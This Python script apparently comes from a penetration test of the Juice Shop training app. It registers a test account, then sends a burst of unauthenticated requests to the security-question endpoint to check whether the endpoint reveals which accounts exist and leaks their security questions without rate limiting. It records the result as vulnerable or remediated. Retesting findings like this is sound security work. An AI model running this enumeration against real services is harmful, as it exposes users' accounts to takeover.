#!/usr/bin/env python3
"""pt26: GET /rest/user/security-question is an unauthenticated,
unthrottled account-enumeration oracle.

Found black-box: the real "Forgot Password" page calls
GET /rest/user/security-question?email=X before showing the security
question field, with no login required. Querying it for a freshly
registered test account (never touched by any Juice Shop challenge)
returns that account's exact security question; querying it for a
fabricated email returns an empty object. That observable difference,
with no rate limiting on the endpoint at all, lets anyone enumerate
registered accounts and harvest their security questions at whatever
rate they choose.

Corroborated against routes/securityQuestion.ts: the handler does a
Sequelize lookup keyed only on the query-string email, no auth
middleware, no throttling, res.json({}) on a miss vs. res.json({question})
on a hit. Juice Shop's own challenge catalog only scores resetting six
named NPC accounts by social-engineering their answer; it has no
challenge at all for the oracle itself being hammerable against
arbitrary, non-NPC accounts.

Standard library only (urllib, json).
"""

from __future__ import annotations

import argparse
import json
import sys
import time
import urllib.error
import urllib.request
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent.parent))
import ledger  # noqa: E402

DEFAULT_BLUEPRINT = Path(__file__).resolve().parent / "blueprints" / "pt26-001.json"
BURST_SIZE = 10


def _request(method: str, url: str, token: str | None = None, body: dict | None = None):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method)
    if body is not None:
        req.add_header("Content-Type", "application/json")
    if token:
        req.add_header("Authorization", f"Bearer {token}")
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            text = resp.read()
            return resp.status, (json.loads(text) if text else {})
    except urllib.error.HTTPError as exc:
        try:
            return exc.code, json.loads(exc.read())
        except Exception:
            return exc.code, {}


def _register_with_security_question(target: str, stamp: str) -> str:
    """Registers a fresh victim account and attaches a real security answer,
    replicating the two real calls the registration UI makes
    (POST /api/Users then POST /api/SecurityAnswers with an explicit UserId,
    since that endpoint has no appendUserId middleware of its own)."""
    email = f"pt26-victim-{stamp}@flatline.test"
    password = "Pt26Pass123!"
    status, body = _request("POST", f"{target}/api/Users", body={
        "email": email, "password": password, "passwordRepeat": password,
    })
    if status != 201:
        raise RuntimeError(f"registration of {email} failed: HTTP {status}")
    user_id = body["data"]["id"]

    login_status, login_body = _request("POST", f"{target}/rest/user/login", body={"email": email, "password": password})
    if login_status != 200:
        raise RuntimeError(f"login of {email} failed: HTTP {login_status}")
    token = login_body["authentication"]["token"]

    answer_status, _ = _request("POST", f"{target}/api/SecurityAnswers", token=token, body={
        "SecurityQuestionId": 2, "answer": "FlatlinePt26Answer", "UserId": user_id,
    })
    if answer_status != 201:
        raise RuntimeError(f"attaching security answer for {email} failed: HTTP {answer_status}")

    return email


def run(target: str, blueprint: dict) -> dict:
    ledger.guard_target_host(target)
    stamp = str(int(time.time() * 1000))

    victim_email = _register_with_security_question(target, stamp)

    # Burst: an unauthenticated attacker probing BURST_SIZE distinct emails
    # back to back, no auth header at all, mixing the one real victim email
    # in among fabricated ones -- exactly how an automated enumeration scan
    # would look.
    probe_emails = [victim_email] + [f"pt26-nonexistent-{stamp}-{i}@flatline.test" for i in range(BURST_SIZE - 1)]
    burst_statuses = []
    victim_leaked_in_burst = False
    for email in probe_emails:
        status, body = _request("GET", f"{target}/rest/user/security-question?email={email}")
        burst_statuses.append(status)
        if email == victim_email and status == 200 and body.get("question", {}).get("id") == 2:
            victim_leaked_in_burst = True

    throttled_count = sum(1 for s in burst_statuses if s == 429)
    answered_count = sum(1 for s in burst_statuses if s == 200)

    if answered_count == BURST_SIZE and victim_leaked_in_burst:
        status_result = "VULNERABLE"
        summary = f"All {BURST_SIZE} burst requests were answered with no throttling, including a successful leak of the real victim account's security question."
    elif throttled_count > 0 and answered_count < BURST_SIZE:
        status_result = "REMEDIATED"
        summary = f"{throttled_count}/{BURST_SIZE} burst requests were throttled (HTTP 429); the oracle could not be swept across all {BURST_SIZE} emails."
    else:
        status_result = "ERROR"
        summary = f"Inconclusive: statuses={burst_statuses}, victim_leaked={victim_leaked_in_burst}."

    # Legitimate case: a single, isolated query for one's own email (the real
    # forgot-password page, one request per load), run well after the burst
    # so a fixed-window throttle has had a chance to reset.
    time.sleep(11)
    legit_status, legit_body = _request("GET", f"{target}/rest/user/security-question?email={victim_email}")
    legitimate_own_question_visible = legit_status == 200 and legit_body.get("question", {}).get("id") == 2

    return {
        "vulnerability_id": blueprint["vulnerability_id"],
        "mitre_technique": blueprint["mitre_technique"],
        "target": target,
        "status": status_result,
        "burst_statuses": burst_statuses,
        "throttled_count": throttled_count,
        "answered_count": answered_count,
        "summary": summary,
        "legitimate_own_question_visible": legitimate_own_question_visible,
    }


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--blueprint", default=str(DEFAULT_BLUEPRINT))
    parser.add_argument("--target", default=None, help="Overrides the blueprint's target.host, e.g. to point at the proxy instead.")
    args = parser.parse_args()

    blueprint = json.loads(Path(args.blueprint).read_text())
    target = args.target or blueprint["target"]["host"]

    result = run(target, blueprint)
    print(json.dumps(result, indent=2))

    results_dir = Path(__file__).resolve().parent / "results"
    results_dir.mkdir(exist_ok=True)
    out_path = results_dir / f"{result['vulnerability_id']}-{int(time.time())}.json"
    out_path.write_text(json.dumps(result, indent=2))

    ledger._append_log({"event": "replay_run", "item": "pt26-security-question-enumeration", **result})

    if result["status"] == "ERROR":
        sys.exit(2)


if __name__ == "__main__":
    main()
